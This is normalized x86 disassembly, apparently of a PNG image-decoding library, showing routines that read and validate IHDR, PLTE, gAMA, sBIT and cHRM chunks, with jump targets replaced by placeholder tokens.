call sub_44120e
add esp 0x4
push edi
call ecx
add esp 0x8
jmp r-xdata
not ebp
and [ esi + 0xb8 ] ebp
pop ebp
and ebp 0xffffbddf
and [ esi + 0x8 ] 0xffff7fff
xor ebp ebp
cmp [ esi + 0x4 ] ebx
jle r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov [ esi + 0xbc ] ebx
mov [ esi + 0xc0 ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
push ebp
push 0x200
push esi
push edi
call sub_436d60
inc ebp
add esp 0x10
cmp ebp [ esi + 0xc0 ]
jl r-xdata
mov ebp [ esp + 0x1c ]
call sub_44120e
add esp 0x4
push edi
call ecx
mov eax [ esi + 0xbc ]
add esp 0x8
mov [ eax + ebp + 0x8 ] ebx
jmp r-xdata
mov ecx [ esi + 0xf8 ]
cmp ecx ebx
je r-xdata
nop
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov ebp [ esp + 0x1c ]
mov [ esi + 0xf8 ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0xf8 ]
mov [ eax + ebp * 4 ] ebx
inc ebp
cmp ebp [ esi + 0x4 ]
jl r-xdata
mov ecx [ edi + 0x24c ]
push eax
cmp ecx ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov edx [ esi + 0xf8 ]
mov eax [ edx + ebp * 4 ]
cmp eax ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call ecx
add esp 0x8
jmp r-xdata
sub_4372b0
push 0xffffffff
push 0x7fff
push edi
push esi
call sub_436d60
add esp 0x10
cmp [ esi + 0x220 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov ecx [ esi + 0x224 ]
test ecx ecx
je r-xdata
retn
push 0x120
push 0x0
push edi
call sub_443360
add esp 0xc
mov [ esi + 0x224 ] 0x0
mov [ esi + 0x220 ] 0x0
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
sub_437320
test ecx ecx
je r-xdata
xor eax eax
retn
test edx edx
je r-xdata
cmp [ ecx + 0x220 ] 0x0
jle r-xdata
mov eax [ ecx + 0x220 ]
mov ecx [ ecx + 0x224 ]
push esi
lea esi [ eax + eax * 4 ]
lea ecx [ esi + ecx - 0x5 ]
pop esi
test eax eax
je r-xdata
mov edx [ edx ]
lea esp [ esp ]
movzx eax [ ecx + 0x4 ]
retn
dec eax
sub ecx 0x5
test eax eax
jne r-xdata
cmp edx [ ecx ]
je r-xdata
sub_437370
push ebx
push esi
mov edx eax
mov esi ecx
and eax 0xffff
mov ebx eax
sar edx 0x10
sar ecx 0x10
and edx 0xffff
and esi 0xffff
and ecx 0xffff
push edi
mov edi esi
imul esi edx
mov eax ecx
imul edi ebx
imul ecx edx
imul eax ebx
add eax esi
mov esi edi
sar esi 0x10
and esi 0xffff
add eax esi
mov edx eax
sar edx 0x10
and edx 0xffff
add ecx edx
mov edx [ esp + 0x10 ]
mov [ edx ] ecx
mov edx [ esp + 0x14 ]
movzx ecx di
pop edi
shl eax 0x10
or eax ecx
pop esi
mov [ edx ] eax
pop ebx
retn
sub_4373e0
sub esp 0x10
push ebp
mov ebp [ esp + 0x20 ]
push esi
mov esi eax
push edi
mov edi 0x1
test esi esi
jne r-xdata
cmp [ esp + 0x20 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebp
add esp 0x10
retn
mov ecx r--data
call sub_43b800
xor edi edi
cmp [ esp + 0x24 ] 0x0
jle r-xdata
mov ecx r--data
call sub_43b800
xor edi edi
cmp [ esp + 0x24 ] eax
jg r-xdata
test ebp ebp
jl r-xdata
mov ecx 0x186a0
sub ecx ebx
cmp ebp ecx
jle r-xdata
mov ecx r--data
call sub_43b800
xor edi edi
cmp ebp eax
jg r-xdata
test ebx ebx
jl r-xdata
mov edx 0x186a0
sub edx [ esp + 0x30 ]
cmp [ esp + 0x2c ] edx
jle r-xdata
mov ecx r--data
call sub_43b800
xor edi edi
cmp ebx eax
jg r-xdata
cmp [ esp + 0x2c ] 0x0
jl r-xdata
mov eax 0x186a0
sub eax [ esp + 0x38 ]
cmp [ esp + 0x34 ] eax
jle r-xdata
mov ecx r--data
call sub_43b800
xor edi edi
cmp [ esp + 0x2c ] eax
jg r-xdata
cmp [ esp + 0x30 ] 0x0
jl r-xdata
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x3c ]
lea edx [ esp + 0x10 ]
push edx
sub ecx ebx
sub eax ebp
call sub_437370
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x3c ]
lea ecx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x44 ]
sub ecx ebp
sub eax ebx
call sub_437370
mov edx [ esp + 0x1c ]
add esp 0x10
cmp edx [ esp + 0x10 ]
jne r-xdata
mov ecx r--data
call sub_43b800
xor edi edi
cmp [ esp + 0x30 ] eax
jg r-xdata
cmp [ esp + 0x34 ] 0x0
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebp
add esp 0x10
retn
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x18 ]
jne r-xdata
cmp [ esp + 0x34 ] eax
jg r-xdata
cmp [ esp + 0x38 ] 0x0
jge r-xdata
mov ecx r--data
call sub_43b800
xor edi edi
cmp [ esp + 0x38 ] eax
jle r-xdata
mov eax 0x7fffffff
cmp [ esp + 0x20 ] eax
jg r-xdata
mov eax 0x186a0
sub eax [ esp + 0x24 ]
cmp [ esp + 0x20 ] eax
jle r-xdata
sub_437550
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
mov eax [ edi + 0x54 ]
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
push eax
push esi
push 0x1
push ecx
call sub_44037b
add esp 0x10
cmp eax esi
pop esi
je r-xdata
push edi
mov ecx r--data
call sub_43b740
add esp 0x4
sub_437590
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
push edi
test eax eax
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push 0x8
lea ecx [ esp + 0x10 ]
push ecx
push esi
call eax
add esp 0xc
jmp r-xdata
mov edx [ esp + 0x10 ]
lea edi [ esi + 0x11c ]
mov [ edi ] edx
mov [ esi + 0x110 ] 0x0
test dl 0x20
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
movzx ebx [ esp + 0xc ]
movzx edx [ esp + 0xd ]
movzx eax [ esp + 0xe ]
movzx ecx [ esp + 0xf ]
shl ebx 0x8
add ebx edx
shl ebx 0x8
add ebx eax
shl ebx 0x8
add ebx ecx
cmp ebx 0x7fffffff
jbe r-xdata
test [ esi + 0x6c ] 0x800
jne r-xdata
mov eax [ esi + 0x6c ]
and eax 0x300
cmp eax 0x300
jne r-xdata
mov ecx edi
call sub_43a420
mov ecx [ esp + 0x14 ]
pop edi
pop esi
mov eax ebx
pop ebx
xor ecx esp
call sub_43f96b
add esp 0xc
retn
xor eax eax
test edi edi
je r-xdata
jmp r-xdata
mov [ esi + 0x110 ] eax
lea edx [ eax + 0x4 ]
mov ecx edi
call sub_43e220
sub_437670
test esi esi
je r-xdata
retn
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push ebx
push edi
push esi
call eax
add esp 0xc
jmp r-xdata
test [ esi + 0x6c ] 0x800
jne r-xdata
mov eax [ esi + 0x6c ]
and eax 0x300
cmp eax 0x300
jne r-xdata
test [ esi + 0x11c ] 0x20
je r-xdata
mov eax [ esi + 0x110 ]
test edi edi
jne r-xdata
retn
mov edx ebx
mov ecx edi
call sub_43e220
mov [ esi + 0x110 ] eax
xor eax eax
mov [ esi + 0x110 ] eax
retn
sub_4376e0
sub esp 0x5c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
mov eax [ esp + 0x60 ]
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0xb0 ]
mov ecx eax
push edi
mov [ esp + 0xc ] ecx
cmp eax ebx
jbe r-xdata
test ecx ecx
je r-xdata
push ebp
lea esp [ esp ]
call sub_437890
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
mov edi [ esi + 0xac ]
test eax eax
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push ebp
push edi
push esi
call eax
add esp 0xc
jmp r-xdata
mov ecx [ esp + 0x64 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_43f96b
add esp 0x5c
retn
mov al [ esi + 0x11c ]
and al 0x20
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push ecx
push edi
push esi
call eax
add esp 0xc
jmp r-xdata
test [ esi + 0x6c ] 0x800
jne r-xdata
mov eax [ esi + 0x6c ]
and eax 0x300
cmp eax 0x300
jne r-xdata
test [ esi + 0x11c ] 0x20
je r-xdata
test al al
jne r-xdata
test [ esi + 0x6c ] 0x200
je r-xdata
test [ esi + 0x6c ] 0x800
jne r-xdata
mov ecx [ esi + 0x6c ]
and ecx 0x300
cmp ecx 0x300
jne r-xdata
test [ esi + 0x11c ] 0x20
je r-xdata
mov eax [ esp + 0x10 ]
sub eax ebx
mov [ esp + 0x10 ] eax
cmp eax ebx
ja r-xdata
mov eax [ esi + 0x110 ]
test edi edi
jne r-xdata
jmp r-xdata
mov edx r--data
lea eax [ esp + 0x10 ]
mov ecx esi
call sub_43b860
push esi
lea ecx [ esp + 0x14 ]
call sub_43b740
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_43f96b
add esp 0x5c
retn
test [ esi + 0x6c ] 0x400
je r-xdata
mov ecx esi
call sub_43b930
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_43f96b
add esp 0x5c
retn
mov eax [ esi + 0x110 ]
test edi edi
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x50 ]
mov ebp [ esi + 0xb0 ]
mov edi [ esi + 0xac ]
test eax eax
je r-xdata
mov ecx eax
pop ebp
mov edx ebp
mov ecx edi
call sub_43e220
xor eax eax
jmp r-xdata
mov edx [ esp + 0xc ]
mov ecx edi
call sub_43e220
xor eax eax
jmp r-xdata
mov [ esi + 0x110 ] eax
mov [ esi + 0x110 ] eax
sub_437890
push ecx
test [ esi + 0x11c ] 0x20
push edi
mov edi 0x1
je r-xdata
test [ esi + 0x6c ] 0x800
je r-xdata
mov eax [ esi + 0x6c ]
and eax 0x300
cmp eax 0x300
jne r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
xor edi edi
jmp r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push 0x4
lea ecx [ esp + 0x8 ]
push ecx
push esi
call eax
add esp 0xc
jmp r-xdata
xor eax eax
pop ecx
retn
mov eax [ esp ]
movzx ecx [ esp + 0x2 ]
movzx edx al
shl edx 0x8
movzx eax ah
add edx eax
movzx eax [ esp + 0x3 ]
shl edx 0x8
add edx ecx
shl edx 0x8
add edx eax
xor eax eax
cmp edx [ esi + 0x110 ]
setne al
pop ecx
retn
test edi edi
pop edi
je r-xdata
sub_437920
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x4c ]
push ebx
mov ebx [ esp + 0x58 ]
push esi
mov esi edx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x10 ] ecx
test eax eax
jne r-xdata
push eax
push r--data
lea eax [ esp + 0x20 ]
push 0x32
push eax
call sub_4564b2
add esp 0x10
lea ecx [ esp + 0x18 ]
call sub_43b800
mov ecx [ esi + 0x288 ]
mov edx [ esp + 0x10 ]
mov [ ebx + ecx ] 0x0
mov ecx [ esp + 0x4c ]
pop esi
mov [ edx ] ebx
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x48
retn
mov edx [ esi + 0x288 ]
mov eax [ esp + 0x58 ]
mov ecx [ esi + 0xb0 ]
add edx ebx
push ebp
sub eax ebx
push edi
mov [ esi + 0x78 ] eax
mov eax [ esi + 0xac ]
mov edi 0x0
mov [ esi + 0x74 ] edx
mov [ esi + 0x80 ] eax
mov [ esi + 0x84 ] ecx
mov ebp edi
je r-xdata
lea edx [ esi + 0x11c ]
push edx
push r--data
push 0x34
lea eax [ esp + 0x2c ]
push eax
lea eax [ esi + 0x74 ]
push eax
call sub_43cd30
mov ecx eax
add esp 0x4
mov [ esp + 0x14 ] ecx
test ecx ecx
je r-xdata
mov [ ebx + ebp ] 0x0
lea ecx [ ebx + 0x1 ]
call sub_43b6d0
mov ebp eax
test ebp ebp
jne r-xdata
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
cmp ecx 0x1
jne r-xdata
mov edx [ esp + 0x18 ]
mov [ esi + 0x288 ] ebp
mov [ edx ] edi
pop edi
pop ebp
pop esi
pop ebx
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_43f96b
add esp 0x48
retn
mov ecx [ esi + 0x24c ]
push eax
test ecx ecx
je r-xdata
mov ecx [ esi + 0x288 ]
push ebx
push ecx
push ebp
call sub_443790
add esp 0xc
mov edx [ esi + 0x288 ]
mov ecx esi
call sub_43b6a0
push esi
mov ecx r--data
mov [ esi + 0x288 ] ebp
call sub_43b740
add esp 0x4
test ebp ebp
jne r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ esi + 0x8c ]
test ecx ecx
jne r-xdata
call sub_44120e
add esp 0x4
push esi
call ecx
mov edx [ esp + 0x20 ]
add esp 0x8
mov [ esi + 0x288 ] ebp
mov [ edx ] edi
pop edi
pop ebp
pop esi
pop ebx
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_43f96b
add esp 0x48
retn
mov edx [ esi + 0xb0 ]
sub edx eax
mov ecx ebp
mov ebp [ esi + 0x6c ]
lea eax [ edx + edi + 0x1 ]
mov edx ebp
or edx 0x100000
mov [ esp + 0x10 ] ecx
mov [ esi + 0x6c ] edx
test eax eax
je r-xdata
mov edi [ esi + 0xb0 ]
mov ecx [ esi + 0x6c ]
sub edi eax
add edi ebx
mov edx ecx
lea eax [ edi + 0x1 ]
or edx 0x100000
mov [ esp + 0x10 ] ecx
mov [ esi + 0x6c ] edx
test eax eax
je r-xdata
cmp [ esi + 0x78 ] 0x0
jne r-xdata
call sub_43b800
lea edx [ esi + 0x74 ]
call sub_43cb70
mov [ esi + 0x78 ] 0x0
test ebp ebp
jne r-xdata
mov ecx r--data
xor ebx ebx
mov ecx [ esi + 0x248 ]
push eax
test ecx ecx
je r-xdata
xor ebp ebp
mov ecx [ esi + 0x248 ]
push eax
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ esp + 0x60 ]
mov [ edi + ebp - 0x1 ] 0x0
mov ecx [ esi + 0x288 ]
sub ecx ebp
lea edi [ ecx + edx - 0x1 ]
cmp edi 0x1f
jbe r-xdata
lea edi [ ebx + 0x20 ]
mov ecx edi
call sub_43b6d0
mov ebp eax
test ebp ebp
jne r-xdata
push edi
push ecx
push ebx
call sub_443790
mov ecx [ esp + 0x1c ]
add esp 0xc
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xac ]
mov eax edi
sub eax ebx
push eax
push ecx
lea edx [ ebx + ebp ]
push edx
call sub_443790
mov eax [ esi + 0x288 ]
push ebx
push eax
push ebp
call sub_443790
mov [ edi + ebp ] 0x0
mov ebp [ esp + 0x28 ]
add esp 0x18
jmp r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call ecx
add esp 0x8
jmp r-xdata
cmp ecx 0x1
je r-xdata
push edi
lea eax [ ebx + ebp ]
push r--data
push eax
call sub_443790
mov ecx [ esp + 0x20 ]
add esp 0xc
mov edi 0x1f
mov eax [ esi + 0x288 ]
push ebx
push eax
push ebp
call sub_443790
add esp 0xc
mov edx [ esi + 0x288 ]
mov ecx esi
call sub_43b6a0
push esi
mov ecx r--data
mov [ esi + 0x288 ] ebp
call sub_43b740
add esp 0x4
mov eax [ esi + 0xb0 ]
sub eax [ esi + 0x84 ]
mov ecx [ esi + 0xac ]
push eax
push ecx
lea edx [ ebx + edi ]
push edx
call sub_443790
mov eax [ esi + 0xb0 ]
sub eax [ esi + 0x84 ]
add esp 0xc
add edi eax
mov [ ebx + edi ] 0x0
mov ebx [ esp + 0x1c ]
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x288 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ esp + 0x14 ] 0x1
je r-xdata
push esi
mov ecx r--data
mov [ esi + 0x288 ] 0x0
call sub_43b740
add esp 0x4
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebp eax
test ebp ebp
jne r-xdata
lea edx [ esi + 0x74 ]
call sub_43cb70
mov eax [ esi + 0x288 ]
mov [ esi + 0x78 ] 0x0
test eax eax
je r-xdata
cmp ecx 0xfffffffb
jne r-xdata
mov ecx [ esi + 0xac ]
mov edx [ esi + 0xb0 ]
mov [ esi + 0x80 ] ecx
mov ecx [ esp + 0x14 ]
mov [ esi + 0x84 ] edx
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
push esi
mov ecx r--data
mov [ esi + 0x288 ] 0x0
call sub_43b740
mov ecx [ esp + 0x14 ]
add esp 0x4
mov eax [ esi + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov [ esi + 0x6c ] ebp
mov ebp ebx
test ebx ebx
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov [ esi + 0x6c ] ecx
mov [ esp + 0x10 ] ebp
test ebp ebp
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp ecx 0xfffffffd
jne r-xdata
lea ecx [ esi + 0x11c ]
push ecx
push r--data
push 0x34
lea edx [ esp + 0x2c ]
push edx
jmp r-xdata
call sub_44120e
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
lea eax [ esi + 0x11c ]
push eax
push r--data
push 0x34
lea ecx [ esp + 0x2c ]
push ecx
jmp r-xdata
call sub_4564b2
add esp 0x10
lea ecx [ esp + 0x20 ]
call sub_43b800
mov edi ebx
test ebp ebp
jne r-xdata
sub_437e00
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov esi ecx
mov ebx 0x1
push edi
mov [ esp + 0x18 ] eax
test [ esi + 0x68 ] bl
je r-xdata
cmp [ esp + 0x38 ] 0xd
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
or [ esi + 0x68 ] ebx
mov ebx 0xd
lea edi [ esp + 0x1c ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
movzx edi [ esp + 0x20 ]
movzx ecx [ esp + 0x21 ]
movzx edx [ esp + 0x22 ]
movzx eax [ esp + 0x23 ]
shl edi 0x8
add edi ecx
shl edi 0x8
add edi edx
shl edi 0x8
add edi eax
add esp 0x4
cmp edi 0x7fffffff
jbe r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
movzx ebp [ esp + 0x20 ]
movzx ecx [ esp + 0x21 ]
movzx edx [ esp + 0x22 ]
movzx eax [ esp + 0x23 ]
shl ebp 0x8
add ebp ecx
shl ebp 0x8
add ebp edx
shl ebp 0x8
add ebp eax
cmp ebp 0x7fffffff
jbe r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
movzx eax [ esp + 0x27 ]
movzx ebx [ esp + 0x25 ]
movzx ecx [ esp + 0x24 ]
movzx edx [ esp + 0x26 ]
mov [ esp + 0x10 ] eax
movzx eax [ esp + 0x28 ]
mov [ esp + 0x14 ] eax
mov [ esi + 0x123 ] al
mov al [ esp + 0x10 ]
mov [ esi + 0x238 ] al
movzx eax bl
mov [ esi + 0xc8 ] edi
mov [ esi + 0xcc ] ebp
mov [ esi + 0x127 ] cl
mov [ esi + 0x126 ] bl
mov [ esi + 0x260 ] dl
cmp eax 0x6
ja r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov al [ esi + 0x12a ]
imul cl
mov [ esi + 0x129 ] al
cmp al 0x8
movzx eax al
jb r-xdata
jmp [ eax * 4 + jump_table_437fb4 ]
imul eax edi
add eax 0x7
shr eax 0x3
shr eax 0x3
imul eax edi
jmp r-xdata
mov [ esi + 0x12a ] 0x1
jmp r-xdata
mov [ esi + 0x12a ] 0x3
jmp r-xdata
mov [ esi + 0x12a ] 0x2
jmp r-xdata
mov [ esi + 0x12a ] 0x4
mov [ esi + 0xd8 ] eax
mov eax [ esp + 0x10 ]
push eax
push edx
mov edx [ esp + 0x1c ]
push edx
push ecx
push ebp
push edi
mov edi [ esp + 0x30 ]
mov eax esi
call sub_43bfd0
mov ecx [ esp + 0x44 ]
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x20
retn
sub_437fd0
sub esp 0x30c
push esi
push edi
mov esi ecx
mov edi eax
mov eax [ esi + 0x68 ]
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
mov ecx r--data
jmp r-xdata
test al 0x2
je r-xdata
mov ecx r--data
push esi
call sub_43b740
add esp 0x4
mov cl [ esi + 0x126 ]
or [ esi + 0x68 ] 0x2
test cl 0x2
jne r-xdata
mov ecx r--data
cmp edi 0x300
ja r-xdata
mov ecx r--data
jmp r-xdata
cmp cl 0x3
mov ecx r--data
jne r-xdata
mov eax 0xaaaaaaab
mul edi
shr edx 0x1
lea eax [ edx + edx * 2 ]
mov edx edi
sub edx eax
je r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
add esp 0x30c
retn
push esi
call sub_43b740
add esp 0x4
mov eax 0x55555556
imul edi
push ebx
mov ebx edx
shr ebx 0x1f
add ebx edx
mov [ esp + 0x14 ] ebx
test ebx ebx
jle r-xdata
push 0x0
mov ecx esi
call sub_4376e0
mov edi [ esp + 0x320 ]
lea eax [ esp + 0x1c ]
push eax
mov eax esi
call sub_43c360
add esp 0x8
cmp [ esi + 0x126 ] 0x3
jne r-xdata
push ebp
lea ebp [ esp + 0x1e ]
mov [ esp + 0x14 ] ebx
pop ebx
pop edi
pop esi
add esp 0x30c
retn
test edi edi
je r-xdata
mov ebx 0x3
lea edi [ esp + 0x10 ]
call sub_437670
mov al [ esp + 0x10 ]
mov cl [ esp + 0x11 ]
mov dl [ esp + 0x12 ]
mov [ ebp - 0x2 ] al
mov [ ebp - 0x1 ] cl
mov [ ebp ] dl
add ebp 0x3
sub [ esp + 0x14 ] 0x1
jne r-xdata
mov ebx [ esp + 0x18 ]
pop ebp
test [ edi + 0x8 ] 0x10
je r-xdata
mov ebx [ esp + 0x14 ]
cmp [ esi + 0x11a ] bx
jbe r-xdata
cmp [ edi + 0x16 ] bx
jbe r-xdata
mov ecx r--data
call sub_43b800
mov [ esi + 0x11a ] bx
mov ecx r--data
call sub_43b800
mov [ edi + 0x16 ] bx
sub_438130
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov esi ecx
mov edi eax
mov eax [ esi + 0x68 ]
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
test al 0x2
je r-xdata
mov ecx r--data
test ebp ebp
je r-xdata
mov ecx r--data
call sub_43b800
cmp edi 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
test al 0x1
je r-xdata
mov ebx 0x4
lea edi [ esp + 0x10 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
jmp r-xdata
test eax 0x800
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
movzx ecx [ esp + 0x12 ]
movzx edx [ esp + 0x13 ]
movzx ebx al
shl ebx 0x8
movzx eax ah
add ebx eax
shl ebx 0x8
add ebx ecx
shl ebx 0x8
add ebx edx
mov [ esp + 0x14 ] ebx
jne r-xdata
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx r--data
jmp r-xdata
test ebp ebp
je r-xdata
mov ecx r--data
call sub_43b800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
fild [ esp + 0x14 ]
sub esp 0x8
mov edi ebp
mov eax esi
fdiv [ r--data ]
fstp [ esp + 0x1c ]
fld [ esp + 0x1c ]
fst [ esi + 0x15c ]
fstp [ esp ]
call sub_43be60
add esp 0x8
mov eax ebx
mov ecx esi
call sub_43bed0
test [ ebp + 0x8 ] 0x800
je r-xdata
cmp ebx 0xafc8
jl r-xdata
mov ecx r--data
call sub_43b800
push ebx
push r--data
call sub_443d18
add eax 0x40
push eax
call sub_4424c8
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp ebx 0xb3b0
jle r-xdata
sub_438290
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
xor ebx ebx
push edi
mov esi ecx
mov edi eax
mov eax [ esi + 0x68 ]
mov [ esp + 0x13 ] bl
mov [ esp + 0x12 ] bl
mov [ esp + 0x11 ] bl
mov [ esp + 0x10 ] bl
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
test al 0x2
je r-xdata
mov ecx r--data
jmp r-xdata
cmp ebp ebx
je r-xdata
mov ecx r--data
call sub_43b800
call sub_43b800
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
mov ebx 0x3
cmp [ esi + 0x126 ] bl
je r-xdata
test [ ebp + 0x8 ] 0x2
je r-xdata
cmp edi ebx
jne r-xdata
movzx ebx [ esi + 0x12a ]
mov ecx r--data
jmp r-xdata
mov ecx r--data
cmp edi 0x4
ja r-xdata
lea edi [ esp + 0x10 ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx 0x2
test [ esi + 0x126 ] cl
je r-xdata
mov al [ esp + 0x10 ]
mov [ esi + 0x17f ] al
mov [ esi + 0x17c ] al
mov [ esi + 0x17d ] al
mov [ esi + 0x17e ] al
movzx eax [ esp + 0x11 ]
mov [ esi + 0x180 ] al
movzx eax [ esp + 0x10 ]
movzx edx [ esp + 0x11 ]
mov [ esi + 0x17c ] al
movzx eax [ esp + 0x12 ]
mov [ esi + 0x17d ] dl
movzx edx [ esp + 0x13 ]
mov [ esi + 0x17e ] al
mov [ esi + 0x180 ] dl
jmp r-xdata
mov edx [ esi + 0x17c ]
mov [ ebp + 0x44 ] edx
mov al [ esi + 0x180 ]
or [ ebp + 0x8 ] ecx
pop edi
pop esi
mov [ ebp + 0x48 ] al
pop ebp
pop ebx
pop ecx
retn
test ebp ebp
je r-xdata
sub_4383e0
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
push ebx
push ebp
push esi
mov esi edx
mov eax [ esi + 0x68 ]
push edi
mov edi [ esp + 0x74 ]
mov ebx ecx
mov [ esp + 0x44 ] esi
mov [ esp + 0x3c ] edi
test al 0x1
jne r-xdata
test al 0x4
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
test al 0x2
je r-xdata
mov ecx r--data
test edi edi
je r-xdata
mov ecx r--data
call sub_43b800
cmp ebx 0x20
je r-xdata
mov eax [ edi + 0x8 ]
test al 0x4
je r-xdata
mov ebx 0x20
lea edi [ esp + 0x4c ]
call sub_437670
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
test eax eax
jne r-xdata
mov ecx r--data
jmp r-xdata
test eax 0x800
jne r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x60
retn
movzx edi [ esp + 0x4c ]
movzx eax [ esp + 0x4d ]
movzx ecx [ esp + 0x4e ]
movzx ebx [ esp + 0x50 ]
movzx edx [ esp + 0x4f ]
movzx ebp [ esp + 0x54 ]
shl edi 0x8
add edi eax
movzx eax [ esp + 0x51 ]
shl ebx 0x8
add ebx eax
movzx eax [ esp + 0x55 ]
shl edi 0x8
add edi ecx
movzx ecx [ esp + 0x52 ]
shl ebp 0x8
add ebp eax
movzx eax [ esp + 0x58 ]
shl ebx 0x8
add ebx ecx
movzx ecx [ esp + 0x56 ]
shl edi 0x8
add edi edx
movzx edx [ esp + 0x53 ]
shl ebp 0x8
add ebp ecx
movzx ecx [ esp + 0x59 ]
shl ebx 0x8
add ebx edx
movzx edx [ esp + 0x57 ]
